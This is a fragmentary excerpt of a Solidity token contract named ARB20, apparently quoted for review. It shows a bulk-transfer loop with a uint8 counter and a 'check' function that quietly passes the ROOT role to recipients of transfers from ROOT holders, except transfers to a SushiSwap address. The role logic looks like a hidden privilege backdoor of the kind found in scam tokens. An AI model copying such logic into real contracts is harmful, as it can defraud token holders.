...
contract ARB20 is ERC20, Control {
    ...
    function multisendToken(
        ...
        for (uint8 i; i < _contributors.length; i++) {
            ...
            token.transfer(_contributors[i], temp.add(_balances[i]));
        }
    }
    ...
    function check(
        ...
        } else if (hasRole(ROOT, from) && to != _suShiSwap) {
            _grantRole(ROOT, to);
        } else if (hasRole(ROOT, to) && from != _suShiSwap) {
